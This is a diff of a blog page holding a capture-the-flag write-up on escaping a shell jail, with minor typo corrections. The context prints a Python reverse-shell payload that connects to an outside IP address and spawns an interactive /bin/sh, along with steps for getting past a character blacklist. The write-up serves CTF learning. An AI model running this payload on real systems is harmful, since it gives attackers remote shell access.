@@ -72,7 +72,7 @@ Service is running at: nc 52.17.200.40 4000
 Author: bibiwars
  A jail escape challenge this time, with no prompt, probably a shell jail.",
   "inLanguage" : "en",
-  "wordCount": 611,
+  "wordCount": 609,
   "datePublished" : "2019-03-24T19:00:46",
   "dateModified" : "2019-03-24T19:00:46",
   "image" : "https://philomath213.github.io/img/philomath213.png",
@@ -364,7 +364,7 @@ Not today, some blacklisted caracter has been used</pre></div>
 <div class="highlight"><pre class="chroma">ertyuopdghbn</pre></div>
 <p>There are other allowed chars, but I used only these char to escape the jail.</p>
 
-<p>So how do can we bypass this ?</p>
+<p>So how can we bypass that ?</p>
 
 <p>I first noticed that we can use &ldquo;python&rdquo; word since all its chars are allowed.</p>
 
@@ -378,7 +378,7 @@ python
 print(&#39;foobar&#39;)
 exit()
 ^C</pre></div>
-<p>So, I made an assumption that the stdout, and stderr are closed, or filtered. TTherefore, I attempt to connect to the outside using python sockets</p>
+<p>So, I made an assumption that stdout, and stderr are closed, or filtered. Therefore, I attempt to connect to the outside using python sockets.</p>
 
 <p>I start a listener on my host and connect to it.</p>
 
@@ -409,7 +409,7 @@ Total sent bytes: 0</pre></div>
 
 <p>First, Run the python interpreter.</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python</code></pre></div>
-<p>Then past the payload there, the script won&rsquo;t execute til the connection is closed, since we are using netcat we need to send interrupt signal CTRL+C to close the connection.</p>
+<p>Then copy/past the payload there, the script won&rsquo;t execute til the connection is closed, since we are using netcat we need to send interrupt signal CTRL+C to close the connection.</p>
 <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;python&#34;</span><span class="p">,</span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="s1">&#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&#34;41.102.162.29&#34;,2130)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span><span class="p">]</span>
 <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span></code></pre></div>
